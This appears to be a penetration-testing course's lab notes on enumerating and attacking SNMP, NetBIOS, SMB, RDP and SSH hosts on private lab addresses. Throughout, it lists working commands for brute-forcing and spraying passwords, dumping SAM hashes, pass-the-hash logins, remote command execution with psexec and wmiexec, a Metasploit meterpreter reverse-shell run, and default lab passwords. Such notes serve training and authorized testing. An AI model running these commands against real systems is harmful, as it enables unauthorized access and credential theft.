Enumeration & Service
===

🔙 [MENU README](../README.md#note)

# iLab
Module 6 
```
Parrot Security       192.168.0.18    172.19.19.18
Windows Server 2019   192.168.0.20
Windows Server 2008   192.168.0.7, 21
SSH Server            192.168.0.70
WordPress             192.168.0.24
```
---

# SNMP
SNMP (Simple Network Management Protocol) is used for managing and monitoring network devices, commonly on routers, switches, servers, etc. Port: UDP 161
```bash
sudo nmap 192.168.0.* --open -p161 -sU -oG - | grep Up | cut -d ' ' -f2 > snmp_list

sudo nmap 192.168.0.1 --open -p161 
# Observation:
# In the scan above, 192.168.0.1 clearly had SNMP open
# Why does it not show up when scanned individually?

sudo nmap 192.168.0.1 --open -p161 -sU --reason
# Observation:
# If Nmap doesn't include -sU, it treats "Reason: no-response" as closed/not open

# Scan ip_list
sudo nmap -sU -p161 --open -n -Pn -iL ip_list.txt -oG > snmp_list
```
snmp-check
```bash
# Tool to inspect SNMP configuration and security
snmp-check 192.168.0.20

snmp-check 192.168.0.22
```
onesixtyone SNMP Status Scanner 
```bash
# onesixtyone is commonly used to find community strings or brute-force SNMP v1/v2 passwords

# Attempt to use "public" as the Community String to access target device SNMP service and gather device information
onesixtyone -i snmp_list public # Gather host information
```
Nmap Script - SNMP Account
```bash
sudo nmap 192.168.0.20 -p161 -sU -n -Pn --script snmp-win32-users
```
---

# NetBIOS & NetBT
Introduction
```bash
# port
UDP 137 # Name resolution
UDP 138 # Datagram service / service announcements

Generally, modern network communication is built on Sockets (IP:PORT)


# NetBIOS 
Microsoft previously used its own networking architecture based on NetBIOS.
It identifies systems uniquely via NetBIOS Name: 16 characters (chars 1-15: Name, char 16: Service ID).
NetBIOS stands for Network Basic Input/Output System, an OS-level API.

# NetBT (NetBIOS over TCP/IP)
NetBT allows legacy software using NetBIOS APIs to continue working over modern TCP/IP networks (NetBIOS over TCP/IP).
NetBT requires each computer to have a unique NetBIOS name, typically matching the Computer Name.
However, native reliance on this architecture largely ended around Windows 2000.
```
Detection Windows
```bash
# Cmd
nbtstat -n                # Local Computer Name
SERVER2019     <00>       # service.msc -> Workstation service
SERVER2019     <20>       # service.msc -> Server service
# <00> - Workstation Service name
# <03> - Messenger Service name
# <20> - File/Server Service name (Server service)
#         [NetBIOS name of the computer]
# <1B> - Domain Master Browser name
# <1C> - Domain Controller group name
#        [NetBIOS domain name for the machine]
# <1E> - Browser Service Election name
# <1D> - Local Master Browser name
# <1F> - NetDDE Service name

nbtstat -a $ComputerName  # NetBIOS info for specified host
nbtstat -A $IP            # NetBIOS info for remote host by IP
ping $ComputerName
nbtstat -c                # Cache Record
```
Access Windows
```bash
# Windows
net view
net view /domain
net view /domain:workgroup
net view \\192.168.0.7
net view \\$ComputerName

net view \\$ComputerName /all
dir \\$ComputerName/c$

net use \\$ComputerName Pa$$w0rd /u:administrator
```
Detection Linux
```bash
# Scan
nbtscan 192.168.0.1-254
nbtscan 192.168.0.22 -v

# ComputerName > IP
nmblookup $ComputerName
# IP > ComputerName
nmblookup -A $IP
```
Access Linux
```bash
smbclient -N -L 192.168.0.22  # Anonymous login and list shares
smbclient -U 'Administrator%Pa$$w0rd' //192.168.0.22/c$
smbclient -U 'Administrator%Pa$$w0rd' //192.168.0.22/c$ -c 'dir'
```
---

# CIFS / SMB
Intorduction
```
TCP SMB - 445
1. Authentication
2. File & Print sharing(allow file access)
3. IPC (inter-process commuication) > RCE

SMB version
V1 : 
V2 : Added Digital Signatures, preventing MITM attacks
V3 : Added Encryption, protecting against packet sniffing
```
Detect
```bash
# port
TCP 139,445
# Difference: port 139 runs over NetBT; port 445 runs directly over TCP (raw socket)

nmap -iL -p445 -sVC
nmap --script smb-os-discovery,smb-protocols
nmap -n --script smb-os-discovery,smb-protocols $IP
nmap 192.168.0.* -p445 --open -n -Pn -oG - | grep Up | cut -d ' ' -f2 > ip_smb
nmap -iL smb_list.txt -n -Pn -p445 -sV --script smb-os-discovery,smb-protocols
```
Crack Password
```bash
# CrackMapExec - high-performance SMB brute-force and post-exploitation tool
# Install
python3 -m pip list | grep impacket # Impacket Version > 0.9.23
python3 -m pip install --upgrade impacket

# Password brute force
crackmapexec smb ip_smb -u administrator -p $passwordlist | grep 'Pwn3d!'

# Password spraying
crackmapexec smb 192.168.0.7 -u userlist.txt -p $password --continue-on-success
```
Access
```bash
# psexec
psexec.py 'administrator:Pa$$w0rd'@192.168.0.22

# wmiexec
python3 wmiexec.py administrator:1234567@172.25.3.100

# winexe
winexe -U 'Username%Password' //<IP> cmd.exe
winexe -U 'administrator%Pa$$w0rd' //192.168.0.22 cmd.exe

# Hash Access
# Get User + SAM Hash
secretsdump.py 'administrator:Pa$$w0rd'@192.168.0.7
# pth-winexe has a lower success rate on Windows Server 2016 and newer
pth-winexe –U 'Username%<LM_hash:NTLM_hash>' //<IP> cmd.exe
psexec.py 'administrator'@192.168.0.22 -hashes :$hash

# Meta (msf)
msconsole -q
use exploit/windows/smb/psexec
options
set rhost 172.0.0.4
set smbuser administrator
set smbpass 12345
set payload windows/meterpreter/reverse_tcp
exploit
shell
search -f file.txt
```
---

# RDP
```bash
TCP 3389
```
Crack
```bash
# hydra
hydra rdp://192.168.0.7 -l administrator -p 'Pa$$w0rd'
hydra rdp://192.168.0.7 -L Username.txt -P Password.txt

# crowbar
sudo apt install -y crowbar 
git clone https://github.com/galkan/crowbar
apt-get install -y nmap openvpn freerdp-x11 vncviewer
# -v: Verbose output
crowbar [-v] -b rdp -s <IP/CIDR> -u user -c password
crowbar [-v] -b rdp -s <IP/CIDR> -U Users.txt -C Passwords.txt
crowbar -b rdp -s 192.168.0.7/32 -u administrator -C Passwords.txt

tail crowbar.log # Check progress (crowbar runs in background by default)
```
xfreerdp
```bash
# Environment
sudo dpkg -l | grep freerdp
# The following all require version 2.3 or higher
freerdp2-x11
libfreerdp2-2
libfreerdp-client2-2

# update
sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 823BF07CEB5C469B

# Access
xfreerdp /size:90% /v:<rdp_IP> /u:<user> /p:<password>
xfreerdp /size:90% /v:192.168.0.7 /u:'administrator' /p:'Pa$$w0rd'

xfreerdp /size:90% /v:<rdp_IP> /u:<user> /pth:<ntlm_hash>
```
reg
```bash
# Windows Remote Desktop toggle

# 1 = Disabled, 0 = Enabled
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

---

# SSH
Metasploit
```bash
msfconsole -q

use auxiliary/scanner/ssh/ssh_enumusers
set rhosts <IP>
set user_file Wordlist/Username.txt
set check_false true
exploit
```
hydra
```bash
hydra -t 4 -l <username> -P <passwords.txt> ssh://<ssh_IP>
hydra -t 4 -L <users.txt> -P <passwords.txt> ssh://<ssh_IP>

hydra -t 4 -l aleksander -P Passwords.txt ssh://192.168.0.70  #dolphin
hydra -t 4 -l administrator -p 'Infinit3' ssh://192.168.0.70
```

---

# Windows Access
```bash
impacket-atexec CPNETCPNET.LOCALNET/cpent:Pa\$\$w0rd123@127.0.0.1 "certutil -hashfile C:\\Users\\Administrator\\flag.txt SHA256"

impacket-atexec administrator:1234567@172.25.30.4 "dir C:\\Users\\Administrator\\Documents\\"

python3 wmiexec.py administrator:1234567@172.25.30.55
```

---

# OWASPBWA 
```bash
# If the target machine uses this platform, this default password is very commonly used; try it:
# https://code.google.com/archive/p/owaspbwa/wikis/UserGuide.wiki
Pa$$w0rd123
```